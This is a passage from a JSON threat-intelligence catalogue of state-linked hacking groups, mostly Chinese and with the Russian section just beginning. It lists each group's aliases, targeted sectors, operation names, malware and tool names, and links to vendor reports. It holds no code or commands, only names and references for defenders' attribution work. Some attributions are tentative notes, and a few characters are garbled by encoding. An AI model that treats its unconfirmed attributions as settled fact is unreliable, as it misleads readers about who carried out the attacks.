"rdp_crk", "icmp_shell", "Jynxkit", "Gh0st RAT", "NetCommander", "Carberp RAT"], "links": ["https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies", "https://401trg.com/burning-umbrella/", "https://www.secureworks.com/research/threat-group-3279-targets-the-video-game-industry#up2"], "attck_id": null, "comment": "Personas: Laurentiu Moon, Sincoder"}, {"names": ["BARIUM", "TG-2633", "Winnti Umbrella, BRONZE ATLAS"], "targets": "Electronic gaming, multimedia, Internet content industries, technology companies", "operations": [], "description": null, "tools": ["Winnti Rootkit malware"], "links": ["https://cloudblogs.microsoft.com/microsoftsecure/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/?source=mmpc", "https://401trg.pw/burning-umbrella/"], "attck_id": null, "comment": null}, {"names": ["LEAD", "Winnti Umbrella"], "targets": "Multinational, multi-industry companies, textiles, chemicals, electronics, pharmaceutical companies, manufacturing", "operations": [], "description": null, "tools": ["Winnti Rootkit malware"], "links": ["https://cloudblogs.microsoft.com/microsoftsecure/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/?source=mmpc", "https://401trg.pw/burning-umbrella/", "https://www.france24.com/en/20190404-bayer-victim-cyber-attack-german-media"], "attck_id": null, "comment": null}, {"names": ["Iron Group", "Rocke"], "targets": "Cybercrime, Cryptomining, Cryptojacking", "operations": [], "description": null, "tools": ["XBash"], "links": ["https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/", "https://blog.talosintelligence.com/2018/12/cryptomining-campaigns-2018.html", "https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/", "https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html", "https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang#When:18:10:00Z"], "attck_id": null, "comment": null}, {"names": ["Anchor Panda", "Anchor Panda"], "targets": "This threat actor targets government and private sector entities interested in maritime issues in the South China Sea for espionage purposes. Maritime satellite systems, aerospace companies, and defense contractors.", "operations": [], "description": null, "tools": ["Adobe Gh0st", "Poison Ivy", "Torn RAT"], "links": ["http://www.crowdstrike.com/blog/whois-anchor-panda/"], "attck_id": null, "comment": "\u00e2\u0080\u009cPdPD\u00e2\u0080\u009d (50 64 50 44) marker for encrypted binaries"}, {"names": ["Big Panda"], "targets": "Financial services firms", "operations": [], "description": null, "tools": [], "links": ["http://www.darkreading.com/attacks-and-breaches/crowdstrike-falcon-traces-attacks-back-to-hackers/d/d-id/1110402?"], "attck_id": null, "comment": "Mentioned by Alperovitch in 2013 article as targeting financial services industry"}, {"names": ["Electric Panda"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem"], "attck_id": null, "comment": "Listed on slide 8"}, {"names": ["Eloquent Panda"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "attck_id": null, "comment": "Mentioned slide 15"}, {"names": ["Emissary Panda", "Emissary Panda", "LuckyMouse", "BRONZE UNION", "TG-3390", "APT27", "TEMP.Hippo", "ZipToken, Iron Tiger"], "targets": "US Gov and contractors, Western think tanks", "operations": ["A Tale of Two Targets\t"], "description": null, "tools": ["PlugX", "China Chopper Webshell", "HttpBrowser", "Hunter", "ASPXTool", "wce", "gsecdump", "nbtscan", "htran"], "links": ["http://www.secureworks.com/cyber-threat-intelligence/threats/threat-group-3390-targets-organizations-for-cyberespionage/", "http://newsroom.trendmicro.com/blog/operation-iron-tiger-attackers-shift-east-asia-united-states", "https://www.threatconnect.com/blog/threatconnect-discovers-chinese-apt-activity-in-europe/", "https://www.secureworks.com/research/bronze-union", "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/decoding-network-data-from-a-gh0st-rat-variant/", "https://securelist.com/luckymouse-hits-national-data-center/86083/", "https://securelist.com/luckymouse-ndisproxy-driver/87914/", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.secureworks.com/research/a-peek-into-bronze-unions-toolbox", "https://lab52.io/blog/apt27-rootkit-updates/", "https://marcoramilli.com/2020/03/19/is-apt27-abusing-covid-19-to-attack-people/"], "attck_id": "G0027", "comment": null}, {"names": ["Foxy Panda", "Foxy Panda"], "targets": "Technology & Communications", "operations": [], "description": null, "tools": [], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "attck_id": null, "comment": "Listed slide 4"}, {"names": ["Gibberish Panda", "Gibberish Panda"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem"], "attck_id": null, "comment": "Listed slide 8"}, {"names": ["Goblin Panda", "Goblin Panda", "Hellsing", "Cycldek", "Cycldek, Conimes Team, China1937CN Team, Temp.Conimes"], "targets": "Southeast Asia, Government of Vietnam", "operations": [], "description": null, "tools": ["ZeGhost", "PlugX", "tempfun", "NewCore RAT", "Sisfader", "RoyalRoad RTF Weaponizer"], "links": ["http://www.crowdstrike.com/blog/rhetoric-foreshadows-cyber-activity-in-the-south-china-sea/", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-august-goblin-panda/", "https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain", "https://www.fortinet.com/blog/threat-research/cta-security-playbook--goblin-panda.html", "https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_8_koike-nakajima_jp.pdf"], "attck_id": null, "comment": "Weaponizer leaked, new activity wrongly attributed to this long inactive group, possible links to Icefog/Dagger Panda and Temp.Periscope/APT40"}, {"names": ["Hammer Panda"], "targets": "Russia", "operations": [], "description": null, "tools": [], "links": ["http://www.darkreading.com/endpoint/chinese-cyberspies-pivot-to-russia-in-wake-of-obama-xi-pact/d/d-id/1324242"], "attck_id": null, "comment": null}, {"names": ["Hurricane Panda", "Hurricane Panda", "APT31", "Black Vine", "TEMP.Avengers", "Zirconium"], "targets": "Aerospace, Healthcare, Energy (gas & electric turbine manufacturing), Military and defense, Finance, Agriculture, Technology, Japan, United States, United Kingdom, India, Canada, Brazil, South Africa, Australia, Thailand, South Korea, France, Switzerland, Sweden, Finland, Norway", "operations": ["Op. Poisoned Hurricane"], "description": null, "tools": ["China Chopper Webshell", "PlugX", "Mimikatz", "Sakula"], "links": ["http://www.crowdstrike.com/blog/cyber-deterrence-in-action-a-story-of-one-long-hurricane-panda-campaign/", "http://blog.crowdstrike.com/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/", "http://blog.airbuscybersecurity.com/post/2015/09/APT-BlackVine-Malware-Sakula", "https://www.symantec.com/connect/blogs/black-vine-formidable-cyberespionage-group-targeted-aerospace-healthcare-2012", "http://blog.airbuscybersecurity.com/post/2015/10/Malware-Sakula-Evolutions-%28Part-2/2%29", "https://blog.confiant.com/uncovering-2017s-largest-malvertising-operation-b84cd38d6b85", "https://uk.reuters.com/article/uk-china-cyber-norway-visma/china-hacked-norways-visma-to-steal-client-secrets-investigators-idUKKCN1PV14R", "https://raw.githubusercontent.com/GuardaCyber/APT-Groups-and-Operations/master/Reports/FireEye%20Intel%20-%20APT31%20Threat%20Group%20Profile.pdf"], "attck_id": null, "comment": "used free DNS servers provided by Hurricane Electric"}, {"names": ["Impersonating Panda", "Impersonating Panda"], "targets": "Financial sector", "operations": [], "description": null, "tools": [], "links": [], "attck_id": null, "comment": null}, {"names": ["Judgement Panda"], "targets": "Upstream providers (e.g., law firms and managed service providers) to support additional intrusions against high-profile assets", "operations": [], "description": null, "tools": ["Spear-phishing", "URL \u00e2\u0080\u009cweb bugs\u00e2\u0080\u009d and scheduled tasks to automate credential harvesting"], "links": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "attck_id": null, "comment": null}, {"names": ["Karma Panda", "Karma Panda", "CactusPete", "CactusPete", "Tonto Team", "Bisonal (malware), Lone Ranger"], "targets": "Dissident groups", "operations": [], "description": null, "tools": [], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf", "https://securelist.com/apt-trends-report-q1-2019/90643/"], "attck_id": null, "comment": "Listed slide 4"}, {"names": ["Keyhole Panda", "Keyhole Panda", "temp.bottle"], "targets": "Electronics & Communications", "operations": [], "description": null, "tools": [], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "attck_id": null, "comment": "Listed slide 4"}, {"names": ["Kryptonite Panda"], "targets": "Cambodia", "operations": [], "description": null, "tools": ["8.t exploit document builder"], "links": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "attck_id": null, "comment": null}, {"names": ["Mustang Panda", "HoneyMyte", "BRONZE PRESIDENT", "Temp.Hex"], "targets": "Mining sector in Mongolia, private individuals |=| gathering geo-political and economic intelligence, NGOs, political & law enforcement org in South and East Asia", "operations": [], "description": null, "tools": ["Cobalt Strike", "PlugX", "ORat", "RCSession", "Nbtscan", "Nmap", "Wmiexec", "China Chopper web shell"], "links": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations#When:17:14:00Z", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/", "https://securelist.com/apt-trends-report-q3-2019/94530/", "https://www.secureworks.com/research/bronze-president-targets-ngos"], "attck_id": null, "comment": null}, {"names": ["Night Dragon", "Night Dragon"], "targets": "A threat actor compromised U.S. oil companies through spear phishing and remote administration tools. Oil, Energy and Petrochemical (OpNightDragon)", "operations": [], "description": null, "tools": [], "links": ["https://kc.mcafee.com/corporate/index?page=content&id=KB71150", "http://www.mcafee.com/us/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf"], "attck_id": "G0014", "comment": null}, {"names": ["Nightshade Panda", "Nightshade Panda", "APT9"], "targets": "HK, US, SG, MY, JP, IN, KR, TH, TW - Aerospace, Agriculture, Construction, Energy, Healthcare, ,High Tech, Media, Transportation", "operations": [], "description": null, "tools": ["Poison Ivy", "PlugX", "BIGJOLT", "FUNRUN", "GH0ST", "HOMEUNIX", "JIM A", "PHOTO", "POISON IVY", "SKINNYGENE", "SOGU", "VICEROY", "VIPSH ELL", "WETHEAD", "XDOOR", "ZXSHELL"], "links": ["https://otx.alienvault.com/pulse/55bbc68e67db8c2d547ae393/"], "attck_id": null, "comment": null}, {"names": ["Nomad Panda"], "targets": "Central Asian nations", "operations": [], "description": null, "tools": ["8.t exploit document builder"], "links": ["https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "attck_id": null, "comment": null}, {"names": ["Pale Panda"], "targets": null, "operations": [], "description": null, "tools": ["PlugX"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "attck_id": null, "comment": "Mentioned in 2014 Crowdstrike Global Threat Intel Report pg 22"}, {"names": ["Pirate Panda", "Pirate Panda", "KeyBoys"], "targets": null, "operations": [], "description": "Southeast Asia", "tools": [], "links": ["http://www.crowdstrike.com/blog/rhetoric-foreshadows-cyber-activity-in-the-south-china-sea/", "http://www.pwc.co.uk/issues/cyber-security-data-privacy/research/the-keyboys-are-back-in-town.html", "https://blog.rapid7.com/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india/", "https://blogs.cisco.com/security/scope-of-keyboy-targeted-malware-attacks", "https://citizenlab.ca/2016/11/parliament-keyboy/"], "attck_id": null, "comment": null}, {"names": ["Poisonous Panda", "Poisonous Panda"], "targets": "Energy technology, G20, NGOs, Dissident Groups", "operations": [], "description": null, "tools": [], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "attck_id": null, "comment": "Listed slide 4"}, {"names": ["Predator Panda", "Predator Panda"], "targets": "Southeast Asia", "operations": [], "description": null, "tools": ["PlugX"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "attck_id": null, "comment": "Mentioned pg 22 & 42"}, {"names": ["Radio Panda", "Radio Panda"], "targets": null, "operations": [], "description": null, "tools": [], "links": [], "attck_id": null, "comment": null}, {"names": ["Sabre Panda"], "targets": "Umbrella Revolution", "operations": [], "description": null, "tools": [], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "attck_id": null, "comment": "Listed in 2014 Global Threat Report (pg 9) - observed in Umbrella Revolution related activity (pg 28)"}, {"names": ["Spicy Panda"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "attck_id": null, "comment": "Listed in 2014 Global Threat Report - no more details pg 9"}, {"names": ["Stone Panda", "Stone Panda", "APT10", "MenuPass Team", "Red Apollo, CVNX, POTASSIUM, Cloud Hopper, Hogfish"], "targets": "Healthcare; Pharma, Defense, Aerospace, Government, MSP, ", "operations": ["Dust Storm", "Cloud Hopper", "ChessMaster"], "description": "Data exfil over common TCP services (RDP, HTTPS)", "tools": ["Poison Ivy", "EvilGrab", "IEChecker", "ChChes", "PlugX", "RedLeaves", "Quasar", "CobaltStrike", "Trochilus", "UPPERCUT (aka ANEL)", "StoneNetLoader"], "links": ["http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem", "http://researchcenter.paloaltonetworks.com/2017/02/unit42-menupass-returns-new-malware-new-attacks-japanese-academics-organizations/", "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf", "https://www.cylance.com/hubfs/2015_cylance_website/assets/operation-dust-storm/Op_Dust_Storm_Report.pdf", "https://www.isightpartners.com/2016/02/threatscape-media-highlights-update-week-february-24th/", "https://threatpost.com/poison-ivy-rat-spotted-in-three-new-attacks/102022/", "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html", "http://blog.trendmicro.com/trendlabs-security-intelligence/chessmaster-cyber-espionage-campaign/", "https://www.us-cert.gov/ncas/alerts/TA17-117A", "https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf", "https://www.lac.co.jp/lacwatch/people/20180521_001638.html", "https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://blog.ensilo.com/uncovering-new-activity-by-apt10"], "attck_id": "G0045", "comment": "Profile slide 13 & 14"}, {"names": ["Temper Panda", "Temper Panda", "Admin338", "Team338", "admin@338", "338 Team"], "targets": "Target Gov + Military, DIB, Finiancial/Think Tanks, Telco, Academia, Religious organisations", "operations": ["admin@338"], "description": null, "tools": ["Poison Ivy", "jRat", "LOWBALL", "BUBBLEWRAP"], "links": ["https://www.fireeye.com/blog/threat-research/2013/10/know-your-enemy-tracking-a-rapidly-evolving-apt-actor.html", "https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html", "https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html"], "attck_id": null, "comment": "\u00e2\u0080\u009cPdPD\u00e2\u0080\u009d (50 64 50 44) marker for encrypted binaries"}, {"names": ["Test Panda", "Test Panda"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem"], "attck_id": null, "comment": "Listed slide 8"}, {"names": ["Toxic Panda", "Toxic Panda"], "targets": "Dissident Groups", "operations": [], "description": null, "tools": [], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "attck_id": null, "comment": "Listed slide 4"}, {"names": ["Union Panda", "Union Panda"], "targets": "Industrial companies", "operations": [], "description": null, "tools": [], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "attck_id": null, "comment": "Listed slide 4"}, {"names": ["Violin Panda", "Violin Panda", "APT8", "APT20", "Covert Grove"], "targets": "Energy, Chemical Industry, Healthcare and Pharma", "operations": ["th3bug", "Wocao"], "description": null, "tools": ["Poison Ivy", "CAKELOG", "CANDYCLOG", "COOKIECLOG", "CETTRA"], "links": ["http://www.slideshare.net/CrowdStrike/crowdcast-monthly-operationalizing-intelligence-34141777", "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the_nitro_attacks.pdf", "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"], "attck_id": null, "comment": "Listed slide 12"}, {"names": ["Wet Panda", "Wet Panda"], "targets": "Energy ", "operations": [], "description": null, "tools": ["PlugX"], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf", "http://www.slideshare.net/CrowdStrike/crowdcast-monthly-operationalizing-intelligence-34141777"], "attck_id": null, "comment": "Mentioned in 2014 Global Threat Report using PlugX (pg 22)"}, {"names": ["?"], "targets": "Tibetans, Hong Kong, Taiwanese interests and human rights workers, Uyghur Interests", "operations": [], "description": "Active", "tools": ["UP007", "SLServer", "Grabber", "T9000", "Kivars", "PlugX", "Gh0StRAT", "Agent.XST"], "links": ["https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/", "https://citizenlab.org/2016/04/between-hong-kong-and-burma/", "http://pwc.blogs.com/cyber_security_updates/2016/03/taiwant-election-targetting.html"], "attck_id": null, "comment": null}, {"names": ["?"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://web.archive.org/web/20151217200415/https://www.fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL.pdf"], "attck_id": null, "comment": null}, {"names": ["?"], "targets": "Afghan Government", "operations": [], "description": "Watering Hole", "tools": [], "links": ["https://www.threatconnect.com/operation-poisoned-helmand/"], "attck_id": null, "comment": null}, {"names": ["?"], "targets": "USA", "operations": [], "description": null, "tools": [], "links": ["http://web.archive.org/web/20081011233241/http://www.breitbart.com/news/2005/12/12/051212224756.jwmkvntb.html"], "attck_id": null, "comment": null}, {"names": ["?", "Maverick Panda", "PLA Navy", "Sykipot"], "targets": "DIB (Defence Industrial Base) and other government organizations", "operations": [], "description": null, "tools": [], "links": ["https://www.alienvault.com/open-threat-exchange/blog/new-sykipot-developments", "http://blog.trendmicro.com/trendlabs-security-intelligence/sykipot-now-targeting-us-civil-aviation-sector-information/"], "attck_id": null, "comment": null}, {"names": ["Calypso", "Links to Skyipot, Pitty Tiger, Comment Crew, Mirage"], "targets": null, "operations": [], "description": null, "tools": ["Byebe", "CMStar", "Calypso RAT", "PlugX"], "links": ["https://www.ptsecurity.com/ww-en/analytics/calypso-apt-2019/"], "attck_id": null, "comment": null}, {"names": ["Tropic Trooper", "KeyBoy"], "targets": "Taiwan, High-Tech in Asia, Taiwanese Government, Fossil Fuel Provider, Taiwanese, Philippine, and Hong Kong targets, focusing on their government, healthcare, transportation, and high-tech industries", "operations": [], "description": null, "tools": ["Poison Ivy", "PCShare", "Yahoyah"], "links": ["http://researchcenter.paloaltonetworks.com/2016/11/unit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy/", "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"], "attck_id": "G0081", "comment": "Group based in Xiamen, in same area as PLA Navy. Likely a navy SIGINT TRB"}, {"names": ["APT41", "APT41"], "targets": null, "operations": [], "description": null, "tools": ["CRACKSHOT", "GEARSHIFT", "HIGHNOON", "JUMPALL", "POISONPLUG", "HOTCHAI", "LATELUNCH", "LIFEBOAT", "LOWKEY", "NJRAT", "PACMAN", "PHOTO", "POTROAST", "ROCKBOOT", "SAGEHIRE", "SWEETCANDLE", "SOGU", "TERA", "TIDYELF", "WIDETONE", "WINTERLOVE", "XDoor", "Xmrig", "ZxShell"], "links": ["https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html", "https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html", "https://www.fireeye.com/blog/threat-research/2019/10/messagetap-who-is-reading-your-text-messages.html"], "attck_id": "G0096", "comment": "Overlap with BARIUM and Winnti"}, {"names": ["Poison Carp"], "targets": "This threat actor targets smartphones associated with Tibetan and Uyghur activists for espionage purposes.", "operations": [], "description": "Strategic web compromise (watering hole)", "tools": [], "links": ["https://citizenlab.ca/2019/09/poison-carp-tibetan-groups-targeted-with-1-click-mobile-exploits/", "https://googleprojectzero.blogspot.com/2019/08/a-very-deep-dive-into-ios-exploit.html", "https://www.volexity.com/blog/2019/09/02/digital-crackdown-large-scale-surveillance-and-exploitation-of-uyghurs/"], "attck_id": null, "comment": null}, {"names": ["AVIVORE"], "targets": "aerospace and defence industries in the UK and Europe", "operations": [], "description": null, "tools": ["PlugX", "Mimikatz", "WmiExec"], "links": ["https://www.contextis.com/en/blog/avivore", "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2019-CTI-005.pdf"], "attck_id": null, "comment": null}, {"names": ["APT-C-01", "PoisonVine, PoisonIvy"], "targets": "government agencies, military individuals, research institutes, maritime agencies", "operations": [], "description": null, "tools": ["Poison Ivy", "ZxShell", "Kanbox RAT", "CVE-2012-0158", "CVE-2014-6352", "CVE-2017-8759"], "links": ["https://ti.qianxin.com/blog/articles/analysis-of-apt-c-01/", "https://ti.qianxin.com/uploads/2018/09/20/6f8ad451646c9eda1f75c5d31f39f668.pdf", "http://blogs.360.cn/post/APT_C_01_en.html", "https://www.netscout.com/sites/default/files/2019-02/SECR_001_EN-1901%20-%20NETSCOUT%20Threat%20Intelligence%20Report%202H%202018.pdf", "https://www.virusbulletin.com/virusbulletin/2019/11/vb2019-paper-vine-climbing-over-great-firewall-longterm-attack-against-china/", "https://www.virusbulletin.com/uploads/pdf/conference_slides/2019/VB2019-GuPan.pdf"], "attck_id": null, "comment": null}, {"names": ["DarkUniverse"], "targets": "Tibet and Uyghur activists, Syria, Iran, Afghanistan, Tanzania, Ethiopia, Sudan, Russia, Belarus and the United Arab Emirates", "operations": [], "description": "Spearphishing w/CVE-2013-0640 weaponized PDF", "tools": ["ItaDuke"], "links": ["https://securelist.com/new-uyghur-and-tibetan-themed-attacks-using-pdf-exploits/35465/", "https://www.alienvault.com/blogs/labs-research/latest-adobe-pdf-exploit-used-to-target-uyghur-and-tibetan-activists", "https://securelist.com/darkuniverse-the-mysterious-apt-framework-27/94897/"], "attck_id": null, "comment": null}, {"names": ["Taskmasters"], "targets": "Military, government, telecommunication, small businesses", "operations": [], "description": null, "tools": ["RemShell", "404-Input-shell", "Eternal Blue", "Scheduled Tasks"], "links": ["https://www.ptsecurity.com/ww-en/analytics/operation-taskmasters-2019/", "https://www.youtube.com/watch?v=XYuclHsoQO4&feature=youtu.be"], "attck_id": null, "comment": null}, {"names": ["GALLIUM"], "targets": "Telecom", "operations": [], "description": null, "tools": ["BlackMould", "China Chopper", "PoisonIvy", "QuarkBandit", "Htran", "NBTScan", "PsExec", "Winrar", "Netcat"], "links": ["https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/", "https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers"], "attck_id": null, "comment": null}, {"names": ["RANCOR"], "targets": "South-East Asia", "operations": [], "description": null, "tools": ["KHRAT Trojan", "Derusbi", "Dudell", "DDKONG Plugin"], "links": ["https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/", "https://meltx0r.github.io/tech/2019/09/11/rancor-apt.html", "https://research.checkpoint.com/rancor-the-year-of-the-phish/", "https://unit42.paloaltonetworks.com/rancor-cyber-espionage-group-uses-new-custom-malware-to-attack-southeast-asia/"], "attck_id": "G0075", "comment": null}, {"names": ["ChinaZ"], "targets": null, "operations": [], "description": null, "tools": ["Linux.BackDoor.Xnote.1", "Linux/BillGates.Lite", "Linux/UDPfker"], "links": ["https://news.drweb.com/show/?i=9272&lng=en&c=5", "https://blog.malwaremustdie.org/2015/08/mmd-0039-2015-chinaz-made-new-malware.html", "https://blog.malwaremustdie.org/2016/10/mmd-0060-2016-linuxudpfker-and-chinaz.html", "https://www.intezer.com/blog-chinaz-relations/", "https://www.intezer.com/blog-chinese-apts-rising-ia-community-may-2019/", "https://www.intezer.com/blog-chinaz-introduces-new-undetected-malware/", "https://www.botconf.eu/wp-content/uploads/2014/12/2014-2.10-Chinese-Chicken-Multiplatform-DDoS-Botnets.pdf"], "attck_id": null, "comment": null}, {"names": ["APT-C-37", "Slap Bear", "Papa Bear", "Pat/Patted Bear"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://blogs.360.cn/post/analysis-of-apt-c-37.html", "https://zhuanlan.kanxue.com/article-8168.htm", "https://mp.weixin.qq.com/s/lUtXwWjPVMHXfR6oLnXYhQ", "https://cybersecurity.att.com/blogs/labs-research/alien-labs-2019-analysis-of-threat-groups-molerats-and-apt-c-37"], "attck_id": null, "comment": null}, {"names": ["APT-C-27", "Goldmouse/Gold Mouse/Gold Rat"], "targets": "Middle East", "operations": [], "description": null, "tools": [], "links": ["https://ti.360.net/blog/articles/apt-c-27-(goldmouse):-suspected-target-attack-against-the-middle-east-with-winrar-exploit-en/", "https://blog.360totalsecurity.com/en/the-sample-analysis-of-apt-c-27s-recent-attack/", "https://www.pbwcz.cz/Reporty/20180723_CSE_APT27_Syria_v1.pdf"], "attck_id": null, "comment": null}, {"names": ["Storm Cloud"], "targets": null, "operations": ["Holy Water"], "description": "Strategic web compromise (watering hole)", "tools": ["Godlike12", "SweetAlerts"], "links": [], "attck_id": null, "comment": null}]}}, {"russia": {"actors": [{"names": ["Sofacy", "APT28", "Sednit", "Pawn Storm", "Group 74", "Tsar Team", "Fancy Bear", "Strontium", "Swallowtail", "SIG40", "Grizzly Steppe", "TG-4127", "SNAKEMACKEREL", "IRON TWILIGHT"], "targets": "United States government", "operations": [" Russian Doll", "Bundestag", "TV5 Monde \"Cyber Caliphate\"", "EFF Attack", "DNC Hack", "OpOlympics", "Burisma"], "description": null, "tools": ["CHOPSTICK", "CORESHELL", "Winexe", "SOURFACE", "OLDBAIT", "Sofacy", "XAgent", "XTunnel", "WinIDS", "Foozer", "DownRange", "Sedreco Dropper", "Komplex", "DealersChoice", "Downdelph", "Sednit", "USBStealer", "Sedkit", "HideDrv (Rootkit)", "LoJax", "Sofacy", "SeduUploader"], "links": ["https://aptnotes.malwareconfig.com/web/viewer.html?file=../APTnotes/2014/apt28.pdf", "https://app.box.com/s/g55oxdd3q63hyngbjm4fbipfct94wrye", "https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/", "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-pawn-storm.pdf", "https://www2.fireeye.com/rs/848-DID-242/images/wp-mandiant-matryoshka-mining.pdf", "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/", "http://researchcenter.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/", "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/", "http://fancybear.net/", "http://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/", "http://www.welivesecurity.com/2016/10/20/new-eset-research-paper-puts-sednit-under-the-microscope/", "https://www.crowdstrike.com/blog/danger-close-fancy-bear-tracking-ukrainian-field-artillery-units/", "https://www.us-cert.gov/sites/default/files/publications/JAR_16-20296.pdf", "https://www.us-cert.gov/sites/default/files/publications/AR-17-20045_Enhanced_Analysis_of_GRIZZLY_STEPPE_Activity.pdf", "http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html", "https://apnews.com/3bca5267d4544508bb523fa0db462cb2?utm_campaign=SocialFlow&utm_source=Twitter&utm_medium=AP", "https://blog.trendmicro.com/trendlabs-security-intelligence/update-pawn-storm-new-targets-politically-motivated-campaigns/", "https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/", "https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/", "https://securelist.com/a-slice-of-2017-sofacy-activity/83930/", "https://securelist.com/masha-and-these-bears/84311/", "https://cdn.area1security.com/reports/Area-1-Security-PhishingBarismaHoldings.pdf"], "attck_id": null, "comment": "Called out by DHS & FBI as responsible for cyber attacks associated with US election 2016.Allegedly attributed the first UEFI rootkit seen in the wild: LoJax 